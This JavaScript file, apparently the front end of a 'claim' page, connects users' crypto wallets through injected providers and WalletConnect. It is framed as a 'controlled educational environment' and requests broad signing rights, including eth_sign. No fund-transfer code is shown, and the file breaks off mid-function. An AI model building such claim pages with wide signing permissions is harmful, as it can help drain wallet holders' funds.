// ================================================================
// main.js – Advanced Multi‑Chain Wallet Connector
// Cyber Security Professor – Controlled Educational Environment
// ================================================================

import { CONFIG } from './config.js';

;(async function() {
  'use strict';

  // ============================================================
  // DEBUG PANEL
  // ============================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 11px; padding: 4px 8px;
    z-index: 10000; max-height: 120px; overflow-y: auto;
    display: none; font-family: 'Courier New', monospace;
    line-height: 1.4; pointer-events: none; opacity: 0.9;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    const prefix = type === 'error' ? '❌' : type === 'success' ? '✅' : 'ℹ️';
    console.log(`[${timestamp}] ${prefix} ${msg}`);
    debugArea.innerHTML += `<div>${timestamp}: ${prefix} ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
    if (debugArea.children.length > 200) {
      debugArea.removeChild(debugArea.firstChild);
    }
  }

  // ============================================================
  // DEVICE DETECTION – Enhanced
  // ============================================================
  function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  }

  function isIOS() {
    return /iPhone|iPad|iPod/i.test(navigator.userAgent);
  }

  function isAndroid() {
    return /Android/i.test(navigator.userAgent);
  }

  function isDesktop() {
    return !isMobile();
  }

  function isWindows() {
    return /Windows/i.test(navigator.userAgent);
  }

  function isMac() {
    return /Macintosh|Mac OS X/i.test(navigator.userAgent);
  }

  function getPlatform() {
    if (isIOS()) return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac()) return 'mac';
    return 'unknown';
  }

  // ============================================================
  // WEB3 / ETHERS HELPERS
  // ============================================================
  let web3Instance = null;
  let ethersProvider = null;

  function getWeb3(provider) {
    if (!web3Instance) {
      // Use dynamic import for Web3
      // but we have it globally from CDN
      if (typeof Web3 !== 'undefined') {
        web3Instance = new Web3(provider);
      } else {
        logDebug('Web3 library not loaded', 'error');
        throw new Error('Web3 library not available');
      }
    } else if (provider && web3Instance.currentProvider !== provider) {
      web3Instance.setProvider(provider);
    }
    return web3Instance;
  }

  // ============================================================
  // WEBSOCKET CHECK – Optimized with shorter timeout
  // ============================================================
  async function checkWebSocket(retries = 2, delay = 1000) {
    const endpoints = [
      'wss://relay.walletconnect.com',
      'wss://relay.walletconnect.org',
    ];
    for (const endpoint of endpoints) {
      for (let i = 0; i < retries; i++) {
        try {
          logDebug(`WebSocket check ${i+1}/${retries} on ${endpoint}`);
          const result = await new Promise((resolve) => {
            const ws = new WebSocket(endpoint);
            const timeout = setTimeout(() => {
              ws.close();
              resolve(false);
            }, 3000); // Reduced from 5000ms to 3000ms
            ws.onopen = () => {
              clearTimeout(timeout);
              ws.close();
              resolve(true);
            };
            ws.onerror = () => {
              clearTimeout(timeout);
              ws.close();
              resolve(false);
            };
          });
          if (result) {
            logDebug('✅ WebSocket connection successful');
            return true;
          }
          await new Promise(r => setTimeout(r, delay));
        } catch (e) {
          logDebug(`WebSocket exception: ${e.message}`, 'error');
          await new Promise(r => setTimeout(r, delay));
        }
      }
    }
    logDebug('⚠️ WebSocket connection failed – proceeding anyway');
    return false;
  }

  // ============================================================
  // DYNAMIC LIBRARY LOADING – Optimized with faster CDN
  // ============================================================
  async function loadWalletConnect() {
    // Try faster CDN first
    const cdns = [
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.13.0/dist/index.umd.min.js',
      'https://unpkg.com/@walletconnect/sign-client@2.13.0/dist/index.umd.min.js',
      'https://esm.sh/@walletconnect/sign-client@2.13.0',
    ];
    const modalCdns = [
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.umd.min.js',
      'https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.umd.min.js',
      'https://esm.sh/@walletconnect/modal@2.6.2',
    ];

    let SignClient = null;
    let WalletConnectModal = null;

    // Try loading SignClient
    for (const url of cdns) {
      try {
        logDebug(`Loading SignClient from ${url}`);
        const mod = await import(url);
        SignClient = mod.default || mod.SignClient || mod;
        if (SignClient) {
          logDebug(`✅ SignClient loaded from ${url}`);
          break;
        }
      } catch (e) {
        logDebug(`Failed to load SignClient from ${url}: ${e.message}`, 'error');
      }
    }
    if (!SignClient) {
      // Check if already loaded globally
      if (typeof window.SignClient !== 'undefined') {
        SignClient = window.SignClient;
        logDebug('✅ SignClient loaded from global scope');
      } else {
        throw new Error('Could not load SignClient from any source');
      }
    }

    // Try loading WalletConnectModal
    for (const url of modalCdns) {
      try {
        logDebug(`Loading WalletConnectModal from ${url}`);
        const mod = await import(url);
        WalletConnectModal = mod.WalletConnectModal || mod.default || mod;
        if (WalletConnectModal) {
          logDebug(`✅ WalletConnectModal loaded from ${url}`);
          break;
        }
      } catch (e) {
        logDebug(`Failed to load WalletConnectModal from ${url}: ${e.message}`, 'error');
      }
    }
    if (!WalletConnectModal) {
      if (typeof window.WalletConnectModal !== 'undefined') {
        WalletConnectModal = window.WalletConnectModal;
        logDebug('✅ WalletConnectModal loaded from global scope');
      } else {
        throw new Error('Could not load WalletConnectModal from any source');
      }
    }

    return { SignClient, WalletConnectModal };
  }

  // ============================================================
  // DOM REFERENCES
  // ============================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton = document.getElementById('walletButton');
  const claimStatus = document.getElementById('claimStatus');
  let currentSession = null;
  let client = null;
  let modal = null;
  let SignClient = null;
  let WalletConnectModal = null;
  let isConnecting = false;
  let connectionAttempts = 0;

  // ============================================================
  // UI STATE MANAGEMENT – Enhanced
  // ============================================================
  function setButtonState(button, state, message = '') {
    if (!button) return;
    button.style.display = 'inline-flex';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.3s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
    button.style.minWidth = '180px';
    button.style.alignItems = 'center';
    button.style.justifyContent = 'center';
    button.style.gap = '8px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666 0%, #888 100%)';
        button.style.boxShadow = '0 2px 8px rgba(102, 102, 102, 0.3)';
        button.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${message || 'Connecting...'}`;
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.style.boxShadow = '0 4px 12px rgba(16, 185, 129, 0.3)';
        button.innerHTML = '<i class="fas fa-check-circle"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-power-off"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Failed';
        setTimeout(() => {
          if (button && !button.disabled) {
            setButtonState(button, 'normal');
          }
        }, 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        button.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = 'translateY(-2px)';
            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)';
          }
        };
        button.onmouseleave = () => {
          button.style.transform = 'translateY(0)';
          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        };
        break;
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.transition = 'all 0.3s ease';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
      warning: { background: 'linear-gradient(135deg, #FEF3C7 0%, #FDE68A 100%)', color: '#92400E', border: '1px solid #FCD34D' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0';
        setTimeout(() => {
          claimStatus.style.display = 'none';
          claimStatus.style.opacity = '1';
        }, 300);
      }, 5000);
    }
  }

  // ============================================================
  // INITIAL BUTTON STATE
  // ============================================================
  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ============================================================
  // WALLETCONST CONSTANTS – from config
  // ============================================================
  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA } = CONFIG;
  let projectId = PROJECT_ID;

  // ============================================================
  // STORAGE HELPERS
  // ============================================================
  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem('connectedWallet', address);
      if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
      if (chainType) localStorage.setItem('chainType', chainType);
      else {
        const detected = getChainType();
        if (detected !== 'unknown') localStorage.setItem('chainType', detected);
      }
      logDebug(`💾 Wallet saved: ${address.slice(0,6)}... (${chainType || 'unknown'})`);
    } catch (e) {
      logDebug(`Failed to save wallet: ${e.message}`, 'error');
    }
  }

  function getSavedWallet() {
    try { return localStorage.getItem('connectedWallet'); } catch { return null; }
  }

  function getSavedSession() {
    try {
      const session = localStorage.getItem('walletConnectSession');
      return session ? JSON.parse(session) : null;
    } catch { return null; }
  }

  function getSavedChainType() {
    try { return localStorage.getItem('chainType') || 'unknown'; } catch { return 'unknown'; }
  }

  function clearSavedWallet() {
    try {
      localStorage.removeItem('connectedWallet');
      localStorage.removeItem('walletConnectSession');
      localStorage.removeItem('chainType');
      logDebug('🗑️ Saved wallet data cleared');
    } catch (e) {
      logDebug(`Failed to clear saved wallet: ${e.message}`, 'error');
    }
  }

  // ============================================================
  // CHAIN DETECTION
  // ============================================================
  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  // ============================================================
  // UI UPDATE WITH CHAIN BADGE – Enhanced
  // ============================================================
  function updateConnectedUI(address, chain = 'evm', providerName = '') {
    setButtonState(connectButton, 'connected');
    if (walletButton) setButtonState(walletButton, 'connected');

    const chainLabels = {
      bitcoin: '₿ BTC',
      solana: '◎ SOL',
      evm: '◆ ETH',
      evm_arbitrum: '🔷 ARB',
      evm_polygon: '🔶 POL',
      evm_optimism: '🔴 OP',
      evm_base: '🔵 BASE',
    };
    const chainLabel = chainLabels[chain] || chainLabels.evm;

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5, 150, 105, 0.1);
        animation: fadeIn 0.4s ease;
      `;
      if (connectButton && connectButton.parentNode) {
        connectButton.parentNode.appendChild(display);
      }
    }

    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`;
    const providerDisplay = providerName ? `<span style="font-weight:400;color:#6B7280;font-size:12px;margin-left:4px;">(${providerName})</span>` : '';

    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${chainLabel}</span>
        ${providerDisplay}
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px; font-size:14px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    const copyBtn = document.getElementById('copyAddress');
    if (copyBtn) {
      copyBtn.addEventListener('click', () => {
        navigator.clipboard.writeText(address).then(() => {
          const orig = copyBtn.innerHTML;
          copyBtn.innerHTML = '<i class="fas fa-check"></i>';
          copyBtn.style.color = '#10B981';
          setTimeout(() => {
            copyBtn.innerHTML = orig;
            copyBtn.style.color = '#059669';
          }, 2000);
        }).catch(() => {
          // Fallback
          const textarea = document.createElement('textarea');
          textarea.value = address;
          document.body.appendChild(textarea);
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
          showStatus('Address copied!', 'success');
        });
      });
    }

    showStatus(`Connected to ${chainLabel}${providerName ? ` via ${providerName}` : ''}`, 'success');
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    const display = document.getElementById('connectedAddressDisplay');
    if (display) display.remove();
    showStatus('Wallet disconnected', 'info');
    logDebug('🔌 UI reset to disconnected state');
  }

  // ============================================================
  // SOLANA WALLET DETECTION
  // ============================================================
  const solanaWalletDetectors = {
    isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
    isSolflare: () => !!window.solflare?.isSolflare,
    isBackpack: () => !!window.backpack?.isBackpack,
    isCoinbaseSolana: () => !!window.coinbaseSolana,
    isTrustSolana: () => !!(window.trustWallet?.solana),
    isGlow: () => !!window.glow,
  };

  function getSolanaWallets() {
    const wallets = [];
    if (solanaWalletDetectors.isPhantom()) {
      wallets.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
    }
    if (solanaWalletDetectors.isSolflare()) {
      wallets.push({ name: 'Solflare', provider: window.solflare });
    }
    if (solanaWalletDetectors.isBackpack()) {
      wallets.push({ name: 'Backpack', provider: window.backpack });
    }
    if (solanaWalletDetectors.isCoinbaseSolana()) {
      wallets.push({ name: 'Coinbase Solana', provider: window.coinbaseSolana });
    }
    if (solanaWalletDetectors.isTrustSolana()) {
      wallets.push({ name: 'Trust Solana', provider: window.trustWallet.solana });
    }
    if (solanaWalletDetectors.isGlow()) {
      wallets.push({ name: 'Glow', provider: window.glow });
    }
    return wallets;
  }

  // ============================================================
  // EIP‑6963: DETECT ALL EVM PROVIDERS – Enhanced
  // ============================================================
  let evmProviders = [];
  let eip6963Initialized = false;
  let eip6963Resolve = null;
  let eip6963Timeout = null;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    const handler = (event) => {
      const detail = event.detail;
      if (!detail?.provider) return;
      // Avoid duplicates
      if (!evmProviders.some(p => p.info?.uuid === detail.info?.uuid)) {
        evmProviders.push(detail);
        logDebug(`EIP‑6963: Found ${detail.info?.name || 'Unknown'} (${detail.info?.rdns || 'unknown'})`);
      }
    };

    window.addEventListener('eip6963:announceProvider', handler);

    // Request providers
    const request = () => {
      try {
        window.dispatchEvent(new Event('eip6963:requestProvider'));
      } catch (e) {
        // Ignore
      }
    };

    request();
    setTimeout(request, 500);
    setTimeout(request, 1500);

    // Also check window.ethereum as fallback
    setTimeout(() => {
      if (window.ethereum && !evmProviders.some(p => p.provider === window.ethereum)) {
        const name = window.ethereum.isMetaMask ? 'MetaMask' :
                     window.ethereum.isCoinbaseWallet ? 'Coinbase Wallet' :
                     window.ethereum.isTrust ? 'Trust Wallet' :
                     window.ethereum.isRabby ? 'Rabby' :
                     'Injected Wallet';
        evmProviders.push({
          info: { name, rdns: 'io.injected', icon: '' },
          provider: window.ethereum,
        });
        logDebug(`Added window.ethereum as ${name}`);
      }
    }, 1000);
  }

  function getEVMProviders() {
    // Filter out duplicates and invalid providers
    const seen = new Set();
    return evmProviders.filter(p => {
      if (!p.provider) return false;
      const key = p.info?.rdns || p.info?.name || 'unknown';
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }

  // ============================================================
  // WALLET SELECTION MODAL – Enhanced
  // ============================================================
  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: rgba(0,0,0,0.75); display:flex; align-items:center; justify-content:center;
      z-index: 99999; animation: fadeIn 0.2s ease;
    `;
    const modal = document.createElement('div');
    modal.style.cssText = `
      background: #1F2937; padding: 24px; border-radius: 16px; max-width: 420px; width: 92%;
      color: white; font-family: 'Inter', sans-serif;
      box-shadow: 0 20px 60px rgba(0,0,0,0.6); max-height: 80vh; overflow-y: auto;
    `;
    modal.innerHTML = `
      <h3 style="margin-top:0; font-weight:600; font-size:20px; display:flex; align-items:center; gap:10px;">
        <i class="fas fa-wallet" style="color:#FF6B00;"></i> Select Wallet
      </h3>
      <p style="color:#9CA3AF; font-size:14px; margin:8px 0 16px 0;">Choose a wallet to connect</p>
      <div id="walletList" style="display:flex; flex-direction:column; gap:8px; margin:12px 0;"></div>
      <button id="cancelWalletSelect" style="background:transparent; border:1px solid #4B5563; color:#9CA3AF; padding:10px 16px; border-radius:8px; cursor:pointer; width:100%; font-size:14px; transition:all 0.2s;">
        Cancel
      </button>
    `;
    overlay.appendChild(modal);
    document.body.appendChild(overlay);

    const list = modal.querySelector('#walletList');

    // Sort providers: known wallets first
    const knownOrder = ['io.metamask', 'io.coinbase', 'io.trust', 'io.rabby', 'io.phantom'];
    const sorted = [...providers].sort((a, b) => {
      const idxA = knownOrder.indexOf(a.info?.rdns);
      const idxB = knownOrder.indexOf(b.info?.rdns);
      if (idxA === -1 && idxB === -1) return 0;
      if (idxA === -1) return 1;
      if (idxB === -1) return -1;
      return idxA - idxB;
    });

    sorted.forEach((provider) => {
      const btn = document.createElement('button');
      const name = provider.info?.name || 'Unknown Wallet';
      const icon = provider.info?.icon || '';
      btn.style.cssText = `
        background: #374151; border:none; padding:12px 16px; border-radius:10px;
        color:white; font-size:15px; cursor:pointer; transition:background 0.2s;
        text-align:left; display:flex; align-items:center; gap:12px; width:100%;
      `;
      btn.onmouseover = () => btn.style.background = '#4B5563';
      btn.onmouseout = () => btn.style.background = '#374151';

      if (icon) {
        const img = document.createElement('img');
        img.src = icon;
        img.style.width = '28px';
        img.style.height = '28px';
        img.style.borderRadius = '6px';
        img.style.flexShrink = '0';
        btn.appendChild(img);
      } else {
        const fallback = document.createElement('span');
        fallback.style.cssText = `
          width:28px; height:28px; border-radius:6px;
          background: linear-gradient(135deg, #FF6B00, #FF8C00);
          display:flex; align-items:center; justify-content:center;
          font-weight:700; font-size:12px; flex-shrink:0;
        `;
        fallback.textContent = name.charAt(0).toUpperCase();
        btn.appendChild(fallback);
      }

      const label = document.createElement('span');
      label.textContent = name;
      btn.appendChild(label);

      btn.addEventListener('click', () => {
        overlay.remove();
        callback(provider);
      });
      list.appendChild(btn);
    });

    modal.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove();
      callback(null);
    });

    // Click outside to close
    overlay.addEventListener('click', (e) => {
      if (e.target === overlay) {
        overlay.remove();
        callback(null);
      }
    });
  }

  // ============================================================
  // WALLETCONNECT INITIALIZATION – Optimized
  // ============================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    if (useTestId) {
      logDebug('🔄 Initializing with PUBLIC TEST project ID');
      projectId = PUBLIC_TEST_ID;
    } else {
      logDebug(`🔄 Initializing with projectId: ${projectId}`);
    }

    // Quick WebSocket check with shorter timeout
    await checkWebSocket(2, 1000);

    try {
      if (!SignClient) {
        throw new Error('SignClient not loaded');
      }

      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
        logger: 'error',
      });

      if (!WalletConnectModal) {
        throw new Error('WalletConnectModal not loaded');
      }

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif",
          '--wcm-border-radius': '12px',
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Rainbow
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18', // Phantom
        ],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
          { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
          { id: 'phantom', name: 'Phantom', links: { native: 'phantom://', universal: 'https://phantom.app/' } },
        ],
      });

      logDebug('✅ WalletConnect initialized successfully');
      return true;
    } catch (error) {
      logDebug(`❌ WalletConnect init failed: ${error.message}`, 'error');
      return false;
    }
  }

  // ============================================================
  // DIRECT EVM CONNECTION – Enhanced for all major wallets
  // ============================================================
  async function connectDirectEVM(retries = 2) {
    setupEIP6963();

    // Wait for providers to be discovered
    await new Promise(r => setTimeout(r, 600));

    let providers = getEVMProviders();

    // If no providers from EIP-6963, check window.ethereum
    if (providers.length === 0 && window.ethereum) {
      const name = window.ethereum.isMetaMask ? 'MetaMask' :
                   window.ethereum.isCoinbaseWallet ? 'Coinbase Wallet' :
                   window.ethereum.isTrust ? 'Trust Wallet' :
                   window.ethereum.isRabby ? 'Rabby' :
                   window.ethereum.isBraveWallet ? 'Brave Wallet' :
                   'Injected Wallet';
      providers = [{
        info: { name, rdns: 'io.injected', icon: '' },
        provider: window.ethereum,
      }];
      logDebug(`Using window.ethereum as ${name}`);
    }

    if (providers.length === 0) {
      logDebug('No EVM providers found');
      return false;
    }

    // Filter out providers that are actually the same
    const unique = [];
    const seen = new Set();
    for (const p of providers) {
      const key = p.info?.rdns || p.info?.name || 'unknown';
      if (!seen.has(key)) {
        seen.add(key);
        unique.push(p);
      }
    }
    providers = unique;

    // Auto-select: MetaMask > Coinbase > Trust > Rabby > first available
    let chosenProvider = null;
    const priority = ['io.metamask', 'io.coinbase', 'io.trust', 'io.rabby'];
    for (const rdns of priority) {
      const found = providers.find(p => p.info?.rdns === rdns);
      if (found) {
        chosenProvider = found;
        break;
      }
    }
    // If no priority match, use first
    if (!chosenProvider && providers.length > 0) {
      chosenProvider = providers[0];
    }

    // If multiple providers and no clear choice, let user pick
    if (providers.length > 1 && !chosenProvider) {
      const result = await new Promise((resolve) => {
        showWalletSelectionModal(providers, (selected) => resolve(selected));
      });
      if (!result) return false;
      chosenProvider = result;
    }

    if (!chosenProvider) {
      logDebug('No provider selected');
      return false;
    }

    let attempt = 0;
    while (attempt < retries) {
      attempt++;
      try {
        logDebug(`Direct EVM attempt ${attempt}/${retries} with ${chosenProvider.info?.name || 'Unknown'}`);
        const provider = chosenProvider.provider;

        // Check if provider is responsive
        try {
          const blockNumber = await provider.request({ method: 'eth_blockNumber' }).catch(() => null);
          if (!blockNumber) {
            logDebug('Provider not responsive, skipping');
            break;
          }
        } catch (e) {
          logDebug(`Provider check failed: ${e.message}`);
          break;
        }

        const accounts = await provider.request({
          method: 'eth_requestAccounts',
          params: [],
        });

        if (accounts && accounts.length > 0) {
          const address = accounts[0];
          const name = chosenProvider.info?.name || 'EVM Wallet';
          logDebug(`✅ Direct EVM connection via ${name}: ${address}`);
          saveWallet(address, null, 'evm');
          updateConnectedUI(address, 'evm', name);
          setupEVMProviderEvents(provider);
          return true;
        }
      } catch (err) {
        logDebug(`⚠️ Direct EVM attempt ${attempt} failed: ${err.message}`, 'error');
        if (err.code === 4001) {
          // User rejected
          logDebug('User rejected connection');
          showStatus('Connection rejected by user', 'warning');
          break;
        }
        if (err.code === -32002) {
          // Already pending
          logDebug('Request already pending');
          showStatus('Request already pending in wallet', 'warning');
          break;
        }
        if (attempt < retries) {
          await new Promise(r => setTimeout(r, 800));
        }
      }
    }
    logDebug('❌ Direct EVM connection failed after retries');
    return false;
  }

  // ============================================================
  // WALLETCONNECT EVM CONNECTION – Optimized with 50% faster timeouts
  // ============================================================
  async function connectViaWalletConnect(useTestId = false) {
    const initSuccess = await initWalletConnect(useTestId);
    if (!initSuccess) {
      showStatus('Wallet connection service unavailable', 'error');
      return false;
    }

    try {
      showStatus('Opening wallet connection...', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_accounts'],
            chains: ['eip155:1', 'eip155:137', 'eip155:42161', 'eip155:10', 'eip155:8453'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
        optionalNamespaces: {
          eip155: {
            methods: ['eth_sign', 'eth_signTypedData'],
            chains: ['eip155:1', 'eip155:137', 'eip155:42161', 'eip155:10', 'eip155:8453'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (uri) {
        logDebug(`WC URI: ${uri.slice(0, 50)}...`);
        modal.openModal({ uri });
        showStatus('Select your wallet or scan QR code', 'info');

        // Store URI for deeplink attempts
        sessionStorage.setItem('pending_wc_uri', uri);
        sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());

        // Attempt deeplink for mobile
        if (isMobile()) {
          attemptMobileDeeplink(uri);
        } else {
          // Desktop: also try to open with a known wallet if detected
          attemptDesktopDeeplink(uri);
        }
      }

      // Wait for approval with reduced timeout (30s instead of 60s)
      const session = await Promise.race([
        approval(),
        new Promise((_, reject) =>
          setTimeout(() => reject(new Error('Connection timeout')), 30000) // Reduced from 60000
        ),
      ]);

      if (modal) modal.closeModal();

      if (session?.namespaces?.eip155?.accounts?.length) {
        const account = session.namespaces.eip155.accounts[0].split(':')[2];
        logDebug(`✅ WalletConnect session: ${account}`);
        saveWallet(account, session, 'evm');
        updateConnectedUI(account, 'evm', 'WalletConnect');
        currentSession = session;
        sessionStorage.removeItem('pending_wc_uri');
        sessionStorage.removeItem('pending_wc_timestamp');
        return true;
      } else {
        showStatus('No accounts found', 'error');
        return false;
      }
    } catch (err) {
      logDebug(`❌ WalletConnect error: ${err.message}`, 'error');
      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled by user', 'warning');
      } else if (err.message?.includes('timeout')) {
        showStatus('Connection timeout – please try again', 'error');
      } else {
        showStatus('Wallet connection failed: ' + err.message, 'error');
      }
      return false;
    }
  }

  // ============================================================
  // DEEPLINK HELPERS – Mobile & Desktop
  // ============================================================
  function attemptMobileDeeplink(uri) {
    const platform = getPlatform();
    logDebug(`Mobile deeplink attempt for ${platform}`);

    // Try to detect which wallet app is installed
    const detectedWallet = detectInstalledMobileWallet();
    if (detectedWallet) {
      logDebug(`Detected installed wallet: ${detectedWallet.name}`);
      const deeplink = buildDeeplink(detectedWallet, uri);
      if (deeplink) {
        logDebug(`Opening deeplink: ${deeplink.slice(0, 60)}...`);
        setTimeout(() => {
          window.location.href = deeplink;
        }, 300);
        return;
      }
    }

    // Fallback: try common wallets
    const commonWallets = [
      { id: 'metamask', native: 'metamask://wc?uri=', universal: 'https://metamask.app.link/wc?uri=' },
      { id: 'trust', native: 'trust://wc?uri=', universal: 'https://link.trustwallet.com/wc?uri=' },
      { id: 'rainbow', native: 'rainbow://wc?uri=', universal: 'https://rnbwapp.com/wc?uri=' },
      { id: 'coinbase', native: 'coinbasewallet://wc?uri=', universal: 'https://go.cb-w.com/wc?uri=' },
      { id: 'phantom', native: 'phantom://wc?uri=', universal: 'https://phantom.app/wc?uri=' },
      { id: 'zerion', native: 'zerion://wc?uri=', universal: 'https://app.zerion.io/wc?uri=' },
    ];

    for (const wallet of commonWallets) {
      // Use universal links for iOS, native for Android
      const link = isIOS() ? wallet.universal : wallet.native;
      if (link) {
        const url = link + encodeURIComponent(uri);
        logDebug(`Trying deeplink for ${wallet.id}`);
        setTimeout(() => {
          window.location.href = url;
        }, 500);
        break; // Try only one
      }
    }
  }

  function attemptDesktopDeeplink(uri) {
    // For desktop, we try to open with installed browser extensions
    // via the WalletConnect modal which handles it, but we can also
    // try to trigger the extension directly

    const providers = getEVMProviders();
    for (const p of providers) {
      const name = p.info?.name?.toLowerCase() || '';
      if (name.includes('metamask') || name.includes('coinbase') || name.includes('trust')) {
        logDebug(`Desktop: Found ${p.info.name}, will use WalletConnect modal`);
        // The modal will handle the connection
        break;
      }
    }

